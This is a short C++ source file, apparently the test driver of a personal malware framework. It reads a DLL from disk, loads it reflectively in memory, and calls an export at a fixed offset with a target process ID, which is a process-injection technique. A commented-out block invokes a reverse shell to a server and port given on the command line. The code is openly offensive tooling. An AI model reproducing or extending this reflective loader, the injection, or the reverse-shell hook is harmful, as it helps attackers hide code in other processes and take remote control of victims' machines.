#include <cstdio>
#include <cassert>
#include <cstdlib>

#include <vector>

#include "shell/shell.h"
#include "reflecter/reflect.h"
#include "apiget/apiget.h"

#include <windows.h>

void *load(const char *name, size_t *read)
{
    FILE *fp = fopen(name, "rb");
    assert(fp);
    
    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    rewind(fp);
    
    void *ret = malloc(size);
    assert(ret);
    
    ZeroMemory(ret, size);
    *read = size;
    
    fread(ret, 1, size, fp);
    
    fclose(fp);
    
    return ret;
}

int main(int argc, char *argv[])
{
    // if(argc != 3){
        // fprintf(stderr, "usage: %s <server> <port>\n", argv[0]);
        // exit(EXIT_FAILURE);
    // }

    // _Shell(argv[1], argv[2]);
    
    // return 0;

    // dll stuff
    if(argc != 2){
        fprintf(stderr, "usage: %s <pid>\n", argv[0]);
        exit(1);
    }

    size_t size;
    void *dll = load("C:\\Users\\Josh\\Desktop\\malware\\framework\\dll\\test.dll", &size);

    move_dll = 1;
    void *base = _ReflectiveLoad(dll);
    ((void (*)(uint32_t))rva_to_offset(base, 0x1038))(atoi(argv[1]));

    free(dll);

    return 0;
}
